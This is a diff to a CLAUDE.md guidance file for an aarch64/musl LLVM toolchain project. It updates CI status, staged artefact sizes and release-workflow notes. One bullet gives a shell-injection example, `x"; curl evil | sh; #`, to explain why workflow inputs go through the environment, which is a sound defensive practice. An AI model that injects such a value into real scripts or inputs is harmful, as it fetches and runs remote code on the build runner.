@@ -4,17 +4,17 @@ This file provides guidance to Claude Code (claude.ai/code) when working with co
 
 ## Project Status
 
-**Steps 1 to 7 of [README.md](README.md) are implemented; steps 1 to 6 are verified end to end locally.** `main` carries one commit and pushes to `git@github.com:Sepia-OS/llvm.git`, following `Sepia-OS/boot` and `Sepia-OS/rootfs`.
+**Every step of [README.md](README.md) is implemented and green in CI** — run [33606342976](https://github.com/Sepia-OS/llvm/actions/runs/33606342976), 2 h 06 m, commit `b5624c1`. `main` pushes to `git@github.com:Sepia-OS/llvm.git`, following `Sepia-OS/boot` and `Sepia-OS/rootfs`.
 
-**CI has run once and got as far as step 4.** Steps 1 to 3 pass in `debian:trixie-slim`; step 4 failed for a missing host compiler (see below), which is fixed but not yet re-run.
+What that run produced: a **186 MiB** staged tree (9.4M `usr/bin`, 159M `usr/lib`, 17M `usr/include`) packing to a **41 MiB** asset; `libc++.so.1` 1.5 MB, `libc++abi.so.1` 475 KB, `libunwind.so.1` 83 KB, `libobjc.so.4.6` 256 KB, compiler-rt's builtins at `usr/lib/clang/23/lib/linux/`, 1689 libc++ headers and 22 objc headers. `stage-check` passed every assertion, ending with *"C, C++, Objective-C and Objective-C++ have their headers and runtimes"*.
 
-**CI has now proved steps 1 to 5 in the container**, including the full clang/lld cross-build (about 2 hours). Step 5b failed on its first run — built with the cross GCC — and was rebuilt around a host clang; that fix is validated locally in `debian:trixie-slim` but has not yet been through CI. **Step 5c has still never run anywhere.**
+**That is a layout proof, not a behavioural one.** Nothing has yet compiled a program *with* the shipped toolchain — that needs a board or an emulator, and until it happens "the four languages work" remains a claim.
 
 Verified in advance, and worth not re-deriving: libobjc2 2.3's archive unpacks to `libobjc2-2.3/` and its digest is committed; it has no submodules, but it *does* pull robin-map with FetchContent while configuring, so step 5c needs the network and downloads something `checksums/` does not pin; Apple clang 21 both emits aarch64 ELF for `aarch64-unknown-linux-musl` and builds libc++ 23.1.0, so `HOST_CLANG` needs no override on macOS; `apt.llvm.org` publishes `clang-23` for trixie, which is an exact version match for the pinned sources. When something does fail, read `build/runtimes/build.log` or `build/libobjc2/build.log` — CI uploads both.
 
 **The container needs a *host* compiler, and nothing before step 4 reveals that.** Steps 1 to 3 use only the downloaded cross-toolchain, which is self-contained, so they pass on an image with no compiler at all; step 4 builds the tablegen tools with the host's own compiler and dies as `CMake Error at CMakeLists.txt:77 (project): No CMAKE_C_COMPILER could be found`, which reads like a broken CMake invocation rather than a missing package. `gcc g++` are in both workflows' `apt-get` lists for that reason. macOS never shows this - Apple clang is always present - so it is a CI-only failure mode.
 
-`gmake stage` produces a 189 MiB tree: `clang`, `lld`, twelve binutils equivalents, `clang-format`, the two C++ runtime libraries and clang's builtin headers — all aarch64, all against musl 1.2.6.
+`gmake stage` produces a 186 MiB tree: `clang`, `lld`, twelve binutils equivalents, `clang-format`, the LLVM runtimes (compiler-rt, libunwind, libc++abi, libc++), GNUstep libobjc2, the two GCC runtime libraries the clang binary itself needs, and the headers for all of it — all aarch64, all against musl 1.2.6. `gmake dist` packs it to 41 MiB.
 
 | Target | |
 |---|---|
@@ -117,7 +117,7 @@ Two workflows, both calling only documented `make` targets so any failure reprod
 - **[release.yml](.github/workflows/release.yml) deletes every previous release**, with `--cleanup-tag`, before creating the new one. That is safe only because each released commit is also the head of a `rel-<version>` branch, which is never deleted — **so do not add branch cleanup**, or deleting a release would make its commit unreachable. Deletion happens in `publish`, after the build, so nothing is destroyed until there is an asset to replace it with.
 - **The gate does *not* refuse a version that already exists**, unlike `../boot`'s: re-releasing is a supported path here, so an existing `rel-<version>` branch is moved to `main`'s head rather than treated as an error. `gate.outputs.created` records which happened, and `rollback` deletes only a branch this run made.
 - **Creating the release branch triggers `ci.yml` on it** — a second multi-hour build of a commit the gate has already confirmed green. It costs a runner and delays nothing, but it is real money at this scale. The fix, if it is ever wanted, is `branches-ignore: ['rel-*']` in `ci.yml`, not shell logic in `release.yml`.
-- **`print-%` and these variable names are a CI contract**: `DIST_ASSET`, `LLVM_VERSION`, `MUSL_VERSION`, `LLVM_TRIPLE`, `TC_VENDOR`, `TC_VERSION`. The release notes are generated from them rather than restating what the Makefile already knows.
+- **`print-%` and these variable names are a CI contract**: `DIST_ASSET`, `LLVM_VERSION`, `LLVM_MAJOR`, `MUSL_VERSION`, `LLVM_TRIPLE`, `LLVM_RUNTIMES`, `OBJC2_VERSION`, `OBJC_RUNTIME`, `TC_VENDOR`, `TC_VERSION`. `LLVM_MAJOR` is the one both workflows depend on *before* anything is built — it selects the apt.llvm.org repository and the clang package — and the rest are read by `release.yml` to generate the notes rather than restating what the Makefile knows. The release notes are generated from them rather than restating what the Makefile already knows.
 - `inputs.version` reaches bash through the environment, never through `${{ }}` interpolation into a script line — the substitution happens before bash sees the line, so `x"; curl evil | sh; #` would otherwise run.
 
 ## The Two Build Trees
